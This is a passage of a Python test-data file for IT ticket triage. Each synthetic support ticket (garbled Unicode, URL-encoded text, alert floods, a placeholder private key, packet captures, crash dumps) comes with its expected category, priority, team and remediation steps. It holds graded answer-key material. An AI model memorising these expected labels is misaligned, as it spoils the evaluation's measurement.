                "Private Banking | Dubai Office"
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P2,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Investigate access provisioning gap for SharePoint Dubai-Portfolio "
                "site — IAM request IAM-2026-04521 shows approved but permissions "
                "not synced. User needs access for client presentation tomorrow."
            ),
            remediation_steps=[
                "Check IAM request IAM-2026-04521 — verify the provisioning step completed successfully.",
                "Check the SharePoint site permissions for the Dubai-Portfolio site collection.",
                "If provisioning failed, manually grant access and investigate the sync failure.",
                "Verify the user can access all three required documents.",
                "Investigate why the IAM approval did not propagate to SharePoint permissions.",
            ],
            reporter_name="Fatima Al-Rashid",
            reporter_email="fatima.alrashid@contoso.com",
            reporter_department="Private Banking",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "bidi-text", "rtl-ltr-mixed", "arabic-english", "unicode-control"],
            difficulty="hard",
        ),
        # ── DC-091  Zalgo text with combining diacritics ─────────────────
        ScenarioDefinition(
            scenario_id="DC-091",
            subject=(
                "L\u0337\u0332a\u0338\u0327p\u0336\u0321t\u0335\u0328o\u0338\u0327p\u0335\u0322 "
                "w\u0338\u0322o\u0336\u0327n\u0335\u0328'\u0338\u0327t\u0335\u0322 "
                "t\u0335\u0328u\u0338\u0327r\u0336\u0322n\u0335 o\u0338\u0327n\u0335\u0322"
            ),
            description=(
                "H\u0336\u0321\u030ai\u0338\u0327\u030f I\u0338\u0327\u0310T\u0335\u0328\u0311 "
                "S\u0338\u030au\u0336\u0322p\u0335\u0327\u0308p\u0338\u0328\u0311o\u0335\u0327"
                "r\u0336\u0322t\u0338\u030a,\u0335\u0328\u0308\n\n"
                "My laptop will not turn on at all. I press the power button and "
                "nothing happens.\n\n"
                "No lights, no fan spin, nothing. It was working fine yesterday.\n\n"
                "I need it for a client presentation tomorrow.\n\n"
                "The text in this email looks corrupted because my email client "
                "applied excessive Unicode combining characters. I apologize for "
                "the visual mess.\n\n"
                "Thanks,\nDaniel Kwame\nWealth Management"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Request laptop make, model, and asset tag from the reporter. "
                "Check whether any LED indicators appear when pressing the power "
                "button. Arrange a loaner device if needed for the presentation."
            ),
            remediation_steps=[
                "Contact the reporter to gather device details (make, model, asset tag).",
                "Ask whether any LED indicators light up when pressing the power button.",
                "Determine if the laptop was recently dropped, exposed to liquid, or updated.",
                "If basic troubleshooting fails, schedule a hardware inspection.",
                "Provide a loaner device if the repair will take more than one business day.",
            ],
            reporter_name="Daniel Kwame",
            reporter_email="daniel.kwame@contoso.com",
            reporter_department="Wealth Management",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "zalgo-text",
                "combining-diacritics",
                "unicode-corruption",
                "hardware-issue",
            ],
            difficulty="hard",
        ),
        # ── DC-092  URL-encoded content throughout ───────────────────────
        ScenarioDefinition(
            scenario_id="DC-092",
            subject="SharePoint%20file%20access%20denied%20%2D%20urgent",
            description=(
                "Hi%20IT%20Support%2C%0A%0A"
                "I%20am%20unable%20to%20access%20a%20file%20on%20SharePoint.%0A%0A"
                "URL%3A%20https%3A%2F%2Fcontoso.sharepoint.com%2Fsites%2FFinance"
                "%2FShared%2520Documents%2FQ1%2520Report.xlsx%0A%0A"
                "Error%3A%20%22Access%20Denied%20%2D%20You%20do%20not%20have%20"
                "permission%20to%20access%20this%20resource%22%0A%0A"
                "I%20was%20able%20to%20open%20it%20last%20week%20with%20no%20"
                "issues.%20My%20manager%20%40jennifer.wu%40contoso.com%20should"
                "%20have%20granted%20me%20access.%0A%0A"
                "Please%20help%2C%0ASofia%20Marquez%0AFinance"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P3,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Investigate SharePoint file-level permission denial for Q1 Report.xlsx "
                "in the Finance site. Verify whether the reporter's access was revoked "
                "or if the file was moved to a restricted library."
            ),
            remediation_steps=[
                "Decode the URL-encoded ticket to extract the actual SharePoint URL and error.",
                "Check the reporter's permissions on the Finance SharePoint site collection.",
                "Verify whether the file was moved or permissions were changed recently.",
                "If access was revoked, confirm with the manager and re-grant as appropriate.",
                "Confirm the reporter can open the file after remediation.",
            ],
            reporter_name="Sofia Marquez",
            reporter_email="sofia.marquez@contoso.com",
            reporter_department="Finance",
            channel=Channel.PORTAL,
            tags=[
                "data-cleanup",
                "url-encoded",
                "percent-encoding",
                "sharepoint-access",
                "copy-paste-artifact",
            ],
            difficulty="medium",
        ),
        # ── DC-093  Monitoring system alert flood ────────────────────────
        ScenarioDefinition(
            scenario_id="DC-093",
            subject="[CRITICAL] DB connection pool exhaustion — alert storm",
            description=(
                "[PagerDuty Alert] CRITICAL — db-pool-primary: connection pool "
                "exhausted (450/450) at 2026-03-17T14:23:01Z\n"
                "[PagerDuty Alert] CRITICAL — db-pool-primary: connection pool "
                "exhausted (450/450) at 2026-03-17T14:23:31Z\n"
                "[PagerDuty Alert] CRITICAL — db-pool-primary: connection pool "
                "exhausted (450/450) at 2026-03-17T14:24:01Z\n"
                "[PagerDuty Alert] WARNING — app-server-01: response time > 5s "
                "at 2026-03-17T14:24:05Z\n"
                "[PagerDuty Alert] WARNING — app-server-02: response time > 5s "
                "at 2026-03-17T14:24:06Z\n"
                "[PagerDuty Alert] WARNING — app-server-03: response time > 5s "
                "at 2026-03-17T14:24:07Z\n"
                "[PagerDuty Alert] CRITICAL — db-pool-primary: connection pool "
                "exhausted (450/450) at 2026-03-17T14:24:31Z\n"
                "[PagerDuty Alert] CRITICAL — db-pool-primary: connection pool "
                "exhausted (450/450) at 2026-03-17T14:25:01Z\n"
                "[PagerDuty Alert] CRITICAL — db-pool-replica: connection pool "
                "exhausted (200/200) at 2026-03-17T14:25:15Z\n"
                "[PagerDuty Alert] CRITICAL — db-pool-primary: connection pool "
                "exhausted (450/450) at 2026-03-17T14:25:31Z\n"
                "[Nagios] CRITICAL — Service: postgres-primary, Host: db01.contoso"
                ".internal — CRITICAL: 450 active connections (max 450)\n"
                "[Nagios] WARNING — Service: app-health, Host: app01.contoso"
                ".internal — WARNING: health check timeout after 30s\n\n"
                "Hi team — the above alerts have been firing nonstop for the last "
                "20 minutes. The primary database connection pool is fully exhausted "
                "and it is cascading to the app servers. Replica pool also hit its "
                "limit. We need someone to investigate the root cause — likely a "
                "runaway query or connection leak.\n\n"
                "— Ops on-call"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P2,
            team=Team.DATA_PLATFORM,
            needs_escalation=True,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Investigate database connection pool exhaustion on db-pool-primary "
                "(450/450) and db-pool-replica (200/200). Identify the root cause — "
                "likely a runaway query or connection leak — and restore service."
            ),
            remediation_steps=[
                "Identify the top consumers of database connections using pg_stat_activity.",
                "Kill any long-running or idle-in-transaction sessions to free connections.",
                "Check for recent deployments or query changes that may have introduced a leak.",
                "Increase the connection pool limit temporarily if needed to restore service.",
                "Implement connection pool monitoring alerts at 80% threshold to catch this earlier.",
            ],
            reporter_name="Ops On-Call",
            reporter_email="ops.oncall@contoso.com",
            reporter_department="Cloud Infrastructure",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "alert-flood",
                "monitoring-noise",
                "pagerduty",
                "nagios",
                "connection-pool",
            ],
            difficulty="hard",
        ),
        # ── DC-094  SQL query dump pasted inline ─────────────────────────
        ScenarioDefinition(
            scenario_id="DC-094",
            subject="Report aggregation returning wrong totals",
            description=(
                "Hi Data Platform team,\n\n"
                "The quarterly revenue report is showing incorrect aggregation "
                "totals. Here is the query I am running:\n\n"
                "WITH regional_sales AS (\n"
                "    SELECT r.region_name, SUM(s.amount) AS total_sales\n"
                "    FROM sales s\n"
                "    JOIN regions r ON s.region_id = r.id\n"
                "    WHERE s.sale_date BETWEEN '2026-01-01' AND '2026-03-31'\n"
                "    GROUP BY r.region_name\n"
                "),\n"
                "top_regions AS (\n"
                "    SELECT region_name, total_sales\n"
                "    FROM regional_sales\n"
                "    WHERE total_sales > (\n"
                "        SELECT SUM(total_sales) / 10 FROM regional_sales\n"
                "    )\n"
                ")\n"
                "SELECT o.order_id, o.amount, t.region_name, t.total_sales\n"
                "FROM orders o\n"
                "JOIN top_regions t ON o.region_name = t.region_name\n"
                "ORDER BY t.total_sales DESC;\n\n"
                "The total_sales column does not match what Finance is reporting. "
                "I think the JOIN between orders and top_regions is creating "
                "duplicates but I am not sure. Can someone take a look?\n\n"
                "Thanks,\nRaj Patel\nData Engineering"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P3,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[
                MissingInfo.ENVIRONMENT_DETAILS,
                MissingInfo.STEPS_TO_REPRODUCE,
            ],
            next_best_action=(
                "Review the SQL query for the quarterly revenue report — the JOIN "
                "between orders and top_regions likely produces duplicate rows, "
                "inflating the total_sales aggregation."
            ),
            remediation_steps=[
                "Analyze the SQL query for correctness — check for fan-out from the JOIN.",
                "Verify whether the orders-to-regions relationship is one-to-many.",
                "Compare the query output with the Finance team's expected totals.",
                "Suggest a corrected query that avoids duplication (e.g., use a subquery or window).",
                "Schedule a review with the reporter to validate the corrected output.",
            ],
            reporter_name="Raj Patel",
            reporter_email="raj.patel@contoso.com",
            reporter_department="Data Engineering",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "sql-dump",
                "inline-query",
                "report-aggregation",
                "cte-query",
            ],
            difficulty="medium",
        ),
        # ── DC-095  Certificate / private key material accidentally pasted ─
        ScenarioDefinition(
            scenario_id="DC-095",
            subject="SSL certificate expired on api.contoso.com",
            description=(
                "Hi Security team,\n\n"
                "The SSL certificate for api.contoso.com expired today and clients "
                "are getting TLS errors. Here is the certificate and key so you "
                "can see the expiry:\n\n"
                "-----BEGIN CERTIFICATE-----\n"
                "MIIFjTCCA3WgAwIBAgIUDm3mMk3AOBIvSGNP0GFbK9bFzRkwDQYJKoZIhvcNAQEL\n"
                "BQAwXjELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAk5ZMREwDwYDVQQHDAhOZXcgWW9y\n"
                "azEQMA4GA1UECgwHQ29udG9zbzEdMBsGA1UEAwwUYXBpLmNvbnRvc28uY29tMB4X\n"
                "DTI1MDMxN1QxNDAwMDBaFw0yNjAzMTdUMTQwMDAwWjBeMQswCQYDVQQGEwJVUzEL\n"
                "FAKE_CERT_DATA_FOR_SCENARIO_PURPOSES_ONLY_NOT_REAL\n"
                "-----END CERTIFICATE-----\n\n"
                "-----BEGIN RSA PRIVATE KEY-----\n"
                "MIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy0AHB7MhgHcTz6sE2I2yPB\n"
                "aFDrBz8sPPNBMEJJJHGrasfW2EBJHGE4R3hQbLTAOJ1FakePrivateKeyDataForSc\n"
                "enarioPurposesOnlyDoNotUseInProductionOrAnywher3ElseThisIsAT3st0nly\n"
                "-----END RSA PRIVATE KEY-----\n\n"
                "As you can see the cert expired. Please renew it ASAP.\n\n"
                "Thanks,\nMarcus Henley\nCloud Infrastructure"
            ),
            category=Category.SECURITY,
            priority=Priority.P2,
            team=Team.SECURITY_OPS,
            needs_escalation=True,
            missing_info=[MissingInfo.CONFIGURATION_DETAILS],
            next_best_action=(
                "URGENT — Private key material was pasted in a support ticket. "
                "Rotate the api.contoso.com certificate and private key immediately. "
                "Treat the exposed key as compromised."
            ),
            remediation_steps=[
                "Immediately revoke the exposed private key and certificate.",
                "Generate a new key pair and request a new certificate for api.contoso.com.",
                "Deploy the new certificate to all endpoints serving api.contoso.com.",
                "Purge the private key material from the ticketing system and any logs.",
                "Remind the reporter that private keys must never be shared in tickets.",
            ],
            reporter_name="Marcus Henley",
            reporter_email="marcus.henley@contoso.com",
            reporter_department="Cloud Infrastructure",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "sensitive-data",
                "private-key-exposure",
                "pem-certificate",
                "security-incident",
            ],
            difficulty="hard",
        ),
        # ── DC-096  Hex dump (hexdump -C) output ─────────────────────────
        ScenarioDefinition(
            scenario_id="DC-096",
            subject="File corruption on network drive — hex dump attached",
            description=(
                "Hi team,\n\n"
                "I noticed files on the \\\\contoso-nas\\finance share are getting "
                "corrupted. I ran hexdump -C on a corrupted file and here is the "
                "output:\n\n"
                "00000000  50 4b 03 04 14 00 06 00  08 00 00 00 21 00 62 ee  "
                "|PK..........!.b.|\n"
                "00000010  9d 68 5e 01 00 00 90 04  00 00 13 00 08 02 5b 43  "
                "|.h^...........[C|\n"
                "00000020  6f 6e 74 65 6e 74 5f 54  79 70 65 73 5d 2e 78 6d  "
                "|ontent_Types].xm|\n"
                "00000030  6c 20 a2 04 02 28 a0 00  02 00 00 00 00 00 00 00  "
                "|l ...(.........|\n"
                "00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  "
                "|................|\n"
                "*\n"
                "00000060  00 00 00 00 00 00 FF FF  FF FF FF FF FF FF FF FF  "
                "|................|\n"
                "00000070  FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  "
                "|................|\n\n"
                "The file should be a valid .xlsx but it is zero-filled from "
                "offset 0x40 onwards. Multiple files on the same share show "
                "similar corruption patterns. This started around last Thursday.\n\n"
                "Thanks,\nAmira Benyoussef\nFinance"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P3,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[
                MissingInfo.AFFECTED_SYSTEM,
                MissingInfo.REPRODUCTION_FREQUENCY,
            ],
            next_best_action=(
                "Investigate file corruption on \\\\contoso-nas\\finance — multiple "
                ".xlsx files are zero-filled from offset 0x40. Started around last "
                "Thursday; may indicate a storage hardware or firmware issue."
            ),
            remediation_steps=[
                "Check the NAS appliance health logs for disk errors or firmware warnings.",
                "Verify RAID status and check for degraded arrays or failed drives.",
                "Compare the corrupted files against recent backups to assess the scope.",
                "Restore corrupted files from the most recent clean backup.",
                "If the issue persists, engage the NAS vendor for hardware diagnostics.",
            ],
            reporter_name="Amira Benyoussef",
            reporter_email="amira.benyoussef@contoso.com",
            reporter_department="Finance",
            channel=Channel.PORTAL,
            tags=[
                "data-cleanup",
                "hex-dump",
                "binary-output",
                "file-corruption",
                "network-drive",
            ],
            difficulty="medium",
        ),
        # ── DC-097  Mixed date/time format confusion ─────────────────────
        ScenarioDefinition(
            scenario_id="DC-097",
            subject="Meeting room double-bookings — dates are all wrong",
            description=(
                "Hi IT,\n\n"
                "We keep getting meeting room conflicts. The booking system shows "
                "different dates depending on where you look:\n\n"
                "- Outlook says the meeting is on 03/04/2026 (is that March 4 or "
                "April 3?)\n"
                "- The room display panel shows 04-Mar-26\n"
                "- The booking API returns 2026-03-04T14:00:00Z\n"
                "- The export CSV has 1709560800 (epoch seconds)\n"
                "- The audit log shows 04/03/2026 10:00 AM EST\n\n"
                "I booked Conference Room B on what I thought was March 4th at "
                "2 PM ET, but someone else booked the same room for April 3rd "
                "and the system did not flag a conflict. Or maybe we both booked "
                "March 4th and the system just allowed a double-booking?\n\n"
                "This has happened at least three times this month with different "
                "rooms. The London office says they see dates in DD/MM/YYYY but "
                "we see MM/DD/YYYY in New York.\n\n"
                "Thanks,\nPreeti Sharma\nOperations"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P4,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.STEPS_TO_REPRODUCE, MissingInfo.TIMESTAMP],
            next_best_action=(
                "Investigate the meeting room booking system for locale-dependent "
                "date parsing — MM/DD vs DD/MM ambiguity is causing double-bookings "
                "across the New York and London offices."
            ),
            remediation_steps=[
                "Review the booking system's date parsing logic for locale handling.",
                "Verify how dates are stored internally — should be ISO 8601 (YYYY-MM-DD).",
                "Check the three reported double-booking incidents to confirm the root cause.",
                "Apply a fix to normalize date display and input to ISO 8601 across all locales.",
                "Notify affected users and ask them to verify upcoming bookings.",
            ],
            reporter_name="Preeti Sharma",
            reporter_email="preeti.sharma@contoso.com",
            reporter_department="Operations",
            channel=Channel.CHAT,
            tags=[
                "data-cleanup",
                "date-format-confusion",
                "locale-ambiguity",
                "mixed-formats",
                "epoch-timestamp",
            ],
            difficulty="medium",
        ),
        # ── DC-098  Financial ticker / code confusion ────────────────────
        ScenarioDefinition(
            scenario_id="DC-098",
            subject="Bloomberg data feed mapping error — CUSIP/ISIN mismatch",
            description=(
                "Hi Enterprise Apps,\n\n"
                "We are seeing incorrect data in the Bloomberg terminal for several "
                "securities. The mapping between identifiers is wrong:\n\n"
                "- AAPL US Equity (BBG ticker) maps to CUSIP 037833100 which is "
                "correct\n"
                "- But MSFT US Equity maps to CUSIP 594918104 which is actually "
                "the CUSIP for META\n"
                "- ISIN US5949181045 should be MSFT but resolves to META in our "
                "system\n"
                "- SEDOL 2588173 (MSFT on LSE) maps correctly in London but not NY\n"
                "- BBG FIGI BBG000BPH459 shows MSFT but pulls META pricing\n\n"
                "This started after the overnight data feed refresh at 02:15 UTC. "
                "The raw feed file looks correct but something in our mapping "
                "layer is swapping MSFT and META identifiers.\n\n"
                "This is impacting P&L calculations for the equities desk.\n\n"
                "Thanks,\nVictor Nwosu\nQuantitative Analysis"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[
                MissingInfo.CONFIGURATION_DETAILS,
                MissingInfo.APPLICATION_VERSION,
            ],
            next_best_action=(
                "Investigate the Bloomberg data feed mapping layer — MSFT and META "
                "identifiers are swapped after the overnight refresh. Impacting "
                "P&L calculations on the equities desk."
            ),
            remediation_steps=[
                "Compare the raw Bloomberg feed file against the mapped output for MSFT and META.",
                "Identify where in the mapping layer the CUSIP/ISIN swap is occurring.",
                "Correct the mapping and trigger a re-import of affected securities.",
                "Verify P&L calculations are accurate after the fix.",
                "Add validation rules to detect identifier mismatches in future feed imports.",
            ],
            reporter_name="Victor Nwosu",
            reporter_email="victor.nwosu@contoso.com",
            reporter_department="Quantitative Analysis",
            channel=Channel.PHONE,
            tags=[
                "data-cleanup",
                "financial-codes",
                "ticker-symbols",
                "cusip-isin",
                "bloomberg",
                "nlp-confusion",
            ],
            difficulty="hard",
        ),
        # ── DC-099  tcpdump / packet capture output ──────────────────────
        ScenarioDefinition(
            scenario_id="DC-099",
            subject="High DNS query latency — tcpdump output included",
            description=(
                "Hi Network Ops,\n\n"
                "DNS resolution is extremely slow from the trading floor (Building "
                "A, Floor 3). I ran tcpdump and here is what I captured:\n\n"
                "14:23:01.234567 IP 10.50.3.101.52341 > 10.1.1.53.53: 12345+ A? "
                "api.contoso.com. (33)\n"
                "14:23:04.567890 IP 10.1.1.53.53 > 10.50.3.101.52341: 12345 1/0/0 "
                "A 10.100.5.20 (49)\n"
                "14:23:04.568123 IP 10.50.3.101.52342 > 10.1.1.53.53: 12346+ AAAA?"
                " api.contoso.com. (33)\n"
                "14:23:07.891234 IP 10.1.1.53.53 > 10.50.3.101.52342: 12346 0/1/0 "
                "(98)\n"
                "14:23:07.891567 IP 10.50.3.101.52343 > 10.1.1.53.53: 12347+ A? "
                "market-data.contoso.com. (40)\n"
                "14:23:11.123456 IP 10.1.1.53.53 > 10.50.3.101.52343: 12347 1/0/0 "
                "A 10.100.5.30 (56)\n\n"
                "Each DNS query takes over 3 seconds to resolve. The DNS server is "
                "10.1.1.53. This is causing timeouts in our trading applications. "
                "Normal resolution time should be under 10ms.\n\n"
                "Thanks,\nChen Wei\nInstitutional Trading"
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.NETWORK_LOCATION],
            next_best_action=(
                "Investigate DNS resolution latency from the trading floor "
                "(10.50.3.0/24 to DNS server 10.1.1.53) — queries taking 3+ "
                "seconds instead of the expected sub-10ms."
            ),
            remediation_steps=[
                "Check the DNS server 10.1.1.53 for high CPU, memory, or query load.",
                "Verify the network path between 10.50.3.0/24 and 10.1.1.53 for latency.",
                "Check for DNS forwarder misconfigurations or upstream resolver issues.",
                "Consider adding a local caching resolver closer to the trading floor.",
                "Monitor DNS latency after remediation to confirm sub-10ms response times.",
            ],
            reporter_name="Chen Wei",
            reporter_email="chen.wei@contoso.com",
            reporter_department="Institutional Trading",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "tcpdump",
                "packet-capture",
                "dns-latency",
                "raw-network-output",
            ],
            difficulty="medium",
        ),
        # ── DC-100  Screen reader / accessibility tree artifacts ─────────
        ScenarioDefinition(
            scenario_id="DC-100",
            subject="Cannot access self-service portal — screen reader output",
            description=(
                "Hi IT Support,\n\n"
                "I use a screen reader (JAWS) and I cannot access the self-service "
                "IT portal. Here is what my screen reader announces when I try to "
                "navigate the page:\n\n"
                "[banner landmark] Contoso IT Self-Service Portal\n"
                "[navigation landmark] Main Navigation\n"
                "  [link] Home\n"
                "  [link] Submit Ticket\n"
                "  [link] Knowledge Base\n"
                "  [link] My Tickets\n"
                "[main landmark]\n"
                "  [heading level 1] Welcome to IT Self-Service\n"
                "  [region] Login Form\n"
                "    [label] Username [edit text]\n"
                "    [label] Password [edit password]\n"
                "    [button] Sign In\n"
                "    [alert] Error: Authentication failed. Please try again.\n"
                "  [complementary landmark] Quick Links\n"
                "    [list] 3 items\n"
                "      [link] Reset Password\n"
                "      [link] VPN Setup Guide\n"
                "      [link] New Equipment Request\n"
                "[contentinfo landmark] Footer\n\n"
                "When I activate the Sign In button, the screen reader announces "
                "'Error: Authentication failed. Please try again.' but I am "
                "certain my credentials are correct — I just changed my password "
                "yesterday. The portal works for my colleagues who do not use "
                "screen readers.\n\n"
                "Thanks,\nIsabella Torres\nCompliance"
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P3,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Investigate authentication failure on the IT self-service portal "
                "for a screen reader user — may be an accessibility-related login "
                "form issue or a credential sync problem after password change."
            ),
            remediation_steps=[
                "Verify the reporter's credentials are valid and the password change propagated.",
                "Test the self-service portal login with a screen reader to reproduce the issue.",
                "Check if the login form uses JavaScript that interferes with assistive technology.",
                "If a portal bug is found, file a defect with the portal development team.",
                "Provide the reporter with an alternative method to submit tickets until fixed.",
            ],
            reporter_name="Isabella Torres",
            reporter_email="isabella.torres@contoso.com",
            reporter_department="Compliance",
            channel=Channel.PORTAL,
            tags=[
                "data-cleanup",
                "screen-reader",
                "accessibility-tree",
                "aria-landmarks",
                "assistive-technology",
            ],
            difficulty="hard",
        ),
        # ── DC-101  GraphQL introspection query dump ─────────────────────
        ScenarioDefinition(
            scenario_id="DC-101",
            subject="SharePoint site permissions broken - can't access Regulatory Filings library",
            description=(
                "Hi Support,\n\n"
                "I can't access the Regulatory Filings document library on SharePoint. I keep getting "
                "a 403 error. I tried to debug this myself using our internal GraphQL API and here's "
                "what I got back — maybe it helps?\n\n"
                '{"data":{"__schema":{"queryType":{"name":"Query"},"mutationType":{"name":"Mutation"},'
                '"subscriptionType":null,"types":[{"kind":"OBJECT","name":"Query","description":null,'
                '"fields":[{"name":"sitePermissions","description":"Retrieve SharePoint site permissions",'
                '"args":[{"name":"siteUrl","description":null,"type":{"kind":"NON_NULL","name":null,'
                '"ofType":{"kind":"SCALAR","name":"String","ofType":null}},"defaultValue":null},'
                '{"name":"principalId","description":null,"type":{"kind":"SCALAR","name":"Int",'
                '"ofType":null},"defaultValue":null}],"type":{"kind":"LIST","name":null,"ofType":'
                '{"kind":"OBJECT","name":"PermissionEntry","ofType":null}},"isDeprecated":false,'
                '"deprecationReason":null},{"name":"userProfile","description":"Get user profile by UPN",'
                '"args":[{"name":"upn","description":null,"type":{"kind":"NON_NULL","name":null,'
                '"ofType":{"kind":"SCALAR","name":"String","ofType":null}},"defaultValue":null}],'
                '"type":{"kind":"OBJECT","name":"UserProfile","ofType":null},"isDeprecated":false,'
                '"deprecationReason":null},{"name":"groupMembership","description":"List group memberships",'
                '"args":[{"name":"groupId","description":null,"type":{"kind":"NON_NULL","name":null,'
                '"ofType":{"kind":"SCALAR","name":"ID","ofType":null}},"defaultValue":null}],"type":'
                '{"kind":"LIST","name":null,"ofType":{"kind":"OBJECT","name":"GroupMember","ofType":null}},'
                '"isDeprecated":false,"deprecationReason":null},{"name":"auditLog","description":'
                '"Query audit log entries","args":[{"name":"startDate","description":null,"type":'
                '{"kind":"SCALAR","name":"DateTime","ofType":null},"defaultValue":null},{"name":"endDate",'
                '"description":null,"type":{"kind":"SCALAR","name":"DateTime","ofType":null},'
                '"defaultValue":null},{"name":"operation","description":null,"type":{"kind":"SCALAR",'
                '"name":"String","ofType":null},"defaultValue":null}],"type":{"kind":"LIST","name":null,'
                '"ofType":{"kind":"OBJECT","name":"AuditEntry","ofType":null}},"isDeprecated":false,'
                '"deprecationReason":null}],"inputFields":null,"interfaces":[],"enumValues":null,'
                '"possibleTypes":null},{"kind":"OBJECT","name":"PermissionEntry","description":null,'
                '"fields":[{"name":"principalName","type":{"kind":"SCALAR","name":"String","ofType":null}},'
                '{"name":"roleDefinition","type":{"kind":"SCALAR","name":"String","ofType":null}},'
                '{"name":"scope","type":{"kind":"SCALAR","name":"String","ofType":null}}],'
                '"inputFields":null,"interfaces":[],"enumValues":null,"possibleTypes":null}],'
                '"directives":[{"name":"include","description":""},{"name":"skip","description":""}]}}}\n\n'
                "I don't understand any of this GraphQL stuff. The point is: I need access to the "
                "Regulatory Filings library at https://contoso.sharepoint.com/sites/RegulatoryFilings/"
                "Shared%20Documents. My manager Priya Sharma already approved my access two weeks ago "
                "in ServiceNow ticket REQ-20260301-0042 but nothing happened.\n\n"
                "Thanks,\nAlex Chen\nCompliance Analyst, Regulatory Affairs\n"
                "Desk 4-217, NYC Office"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P3,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.AFFECTED_SYSTEM, MissingInfo.PREVIOUS_TICKET_ID],
            next_best_action=(
                "Ignore the GraphQL introspection dump and investigate the SharePoint "
                "permissions issue — verify whether the access grant from REQ-20260301-0042 "
                "was actually applied to the Regulatory Filings site."
            ),
            remediation_steps=[
                "Check ServiceNow ticket REQ-20260301-0042 to confirm approval status and fulfilment.",
                "Verify the reporter's AD group membership against the SharePoint site's permission groups.",
                "If the access grant was not applied, manually add the user to the appropriate SP group.",
                "Clear any cached permission tokens and ask the user to re-authenticate.",
                "Confirm the user can access the Regulatory Filings document library.",
            ],
            reporter_name="Alex Chen",
            reporter_email="alex.chen@contoso.com",
            reporter_department="Regulatory Affairs",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "graphql-introspection",
                "schema-dump",
                "permission-grant-pending",
                "json-schema-noise",
            ],
            difficulty="medium",
        ),
        # ── DC-102  Windows crash dump / minidump output ─────────────────
        ScenarioDefinition(
            scenario_id="DC-102",
            subject="Laptop keeps blue screening - BSOD every 2 hours - URGENT",
            description=(
                "My laptop (asset tag NYC-LT-4892) has been blue screening roughly every 2 hours "
                "since Monday. I lose all my unsettled trade confirmations each time. I managed to "
                "pull this from the minidump file before it crashed again:\n\n"
                "*** STOP 0x0000009F (0x0000000000000003, 0xFFFFE10B3A4C7060, 0xFFFFF8076C9E1B40, "
                "0xFFFFE10B3A832010)\n"
                "DRIVER_POWER_STATE_FAILURE\n\n"
                "STACK_TEXT:\n"
                "fffff807`6c9e1b40 fffff807`6b2a4f21 : 00000000`0000009f 00000000`00000003 "
                "ffffe10b`3a4c7060 fffff807`6c9e1b40 : nt!KeBugCheckEx\n"
                "fffff807`6c9e1b48 fffff807`6b2a4ad0 : 00000000`00000000 ffffe10b`3a4c7060 "
                "00000000`00000000 fffff807`6b1e34a2 : nt!PopIrpWatchdogBugcheck+0x131\n"
                "fffff807`6c9e1bb0 fffff807`6b1d8e46 : ffffe10b`00000003 ffffe10b`3a4c7000 "
                "00000000`00000000 00000000`00000000 : nt!PopIrpWatchdog+0x70\n"
                "fffff807`6c9e1c00 fffff807`6b0d7115 : ffffe10b`37629040 fffff807`6b1e3440 "
                "00000000`00000000 00000000`00000022 : nt!KiProcessExpiredTimerList+0x1d6\n\n"
                "REGISTER STATE:\n"
                "rax=0000000000000003 rbx=ffffe10b3a4c7060 rcx=000000000000009f\n"
                "rdx=0000000000000003 rsi=fffff8076c9e1b40 rdi=ffffe10b3a832010\n"
                "rip=fffff8076b2a5c10 rsp=fffff8076c9e1b40 rbp=fffff8076c9e1c60\n"
                " r8=fffff8076c9e1b40  r9=ffffe10b3a832010 r10=0000000000000000\n"
                "r11=fffff8076c9e19f0 r12=0000000000000000 r13=0000000000000000\n"
                "r14=ffffe10b3a4c7060 r15=0000000000000003\n"
                "cs=0010 ss=0018 ds=002b es=002b fs=0053 gs=002b efl=00040202\n\n"
                "MODULE_NAME: Wdf01000\n"
                "IMAGE_NAME: Wdf01000.sys\n"
                "BUCKET_ID_FUNC_OFFSET: 2a4f21\n"
                "FAILURE_BUCKET_ID: 0x9F_3_IMAGE_Wdf01000.sys\n"
                "OS_VERSION: 10.0.22631.1\n"
                "BUILDLAB_STR: ni_release\n\n"
                "I have no idea what any of this means. I just need my laptop to stop crashing. "
                "I'm in the middle of quarter-end reconciliation and can't afford downtime. "
